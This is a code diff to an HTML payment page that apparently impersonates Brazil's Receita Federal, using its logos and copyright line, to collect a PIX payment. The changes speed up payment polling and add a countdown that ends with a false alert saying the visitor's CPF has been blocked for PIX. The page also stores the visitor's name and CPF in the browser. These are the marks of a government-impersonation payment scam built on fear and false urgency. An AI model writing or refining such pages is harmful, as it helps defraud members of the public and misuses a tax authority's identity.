@@ -162,11 +162,14 @@
             margin-top: 10px;
             line-height: 1.4;
         }
+
         @keyframes pulse {
             0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
             70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
             100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
         }
+
+        /* Loading screen styles */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -212,6 +215,7 @@
     </style>
 </head>
 <body>
+    <!-- Header -->
     <div class="header">
         <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
         <div class="header-icons">
@@ -221,11 +225,13 @@
         </div>
     </div>
 
+    <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-spinner"></div>
         <p style="font-size: 18px; color: #333;">Gerando transação PIX...</p>
     </div>
 
+    <!-- Main Content (initially hidden) -->
     <div class="content" id="mainContent">
         <div class="container">
             <div class="payment-info">
@@ -264,6 +270,7 @@
         </div>
     </div>
 
+    <!-- Footer -->
     <footer class="footer">
         <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
         <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
@@ -271,41 +278,88 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            function checkStatus() {
-                fetch('/check-payment-status/{{ transaction_id }}')
-                .then(response => response.text())
-                .then(text => {
-                    if (text.indexOf('"status":"APPROVED"') !== -1) {
-                        window.location = '/obrigado';
-                    }
-                });
-            }
+            let transactionId = '{{ transaction_id }}';
+            let checkInterval;
+            let hasRedirected = false;
 
-            setInterval(checkStatus, 1000);
-
-            let timeLeft = 600;
-            setInterval(() => {
-                document.getElementById('timer').textContent = 
-                    `${Math.floor(timeLeft/60).toString().padStart(2,'0')}:${(timeLeft%60).toString().padStart(2,'0')}`;
-                if (timeLeft-- <= 0) window.location.href = '/';
+            // Timer functionality
+            let timeLeft = 10 * 60;
+            const timerDisplay = document.getElementById('timer');
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    clearInterval(checkInterval);
+                    timerDisplay.textContent = "00:00";
+                    alert("Tempo expirado! Seu CPF foi bloqueado para operações PIX.");
+                    window.location.href = '/';
+                }
+                timeLeft--;
             }, 1000);
 
+            function doRedirect() {
+                if (hasRedirected) return;
+                hasRedirected = true;
+
+                // Executa o redirecionamento instantaneamente
+                window.location.href = '/obrigado';
+
+                // Operações secundárias que não devem atrasar o redirecionamento
+                try {
+                    localStorage.setItem('userData', JSON.stringify({
+                        nome: '{{ nome }}',
+                        cpf: '{{ cpf }}'
+                    }));
+                    clearInterval(checkInterval);
+                    clearInterval(countdown);
+                } catch (e) {
+                    console.error('Erro nas operações pós-redirecionamento:', e);
+                }
+            }
+
+            function checkPaymentStatus() {
+                if (hasRedirected) return;
+                fetch(`/check-payment-status/${transactionId}`, {
+                    cache: 'no-store'  // Evita cache da resposta
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'APPROVED') doRedirect();
+                })
+                .catch(console.error);
+            }
+
+            // Verifica a cada 300ms para resposta mais rápida
+            checkInterval = setInterval(checkPaymentStatus, 300);
+            checkPaymentStatus(); // Verificação inicial
+
+            // Mostra o conteúdo após carregar
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
             }, 1500);
 
+            // Copiar código PIX
             window.copyPixCode = function() {
-                let button = document.querySelector('.copy-button');
-                navigator.clipboard.writeText(document.getElementById('pixCode').textContent.trim())
-                    .then(() => {
-                        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
-                        button.style.backgroundColor = '#28a745';
+                const pixCode = document.getElementById('pixCode').textContent.trim();
+                const copyButton = document.querySelector('.copy-button');
+                navigator.clipboard.writeText(pixCode).then(
+                    function() {
+                        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                        copyButton.style.backgroundColor = '#28a745';
                         setTimeout(() => {
-                            button.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
-                            button.style.backgroundColor = '#0c326f';
+                            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                            copyButton.style.backgroundColor = '#0c326f';
                         }, 2000);
-                    });
+                    },
+                    function(err) {
+                        console.error('Erro ao copiar:', err);
+                        copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
+                        copyButton.style.backgroundColor = '#dc3545';
+                    }
+                );
             }
         });
     </script>
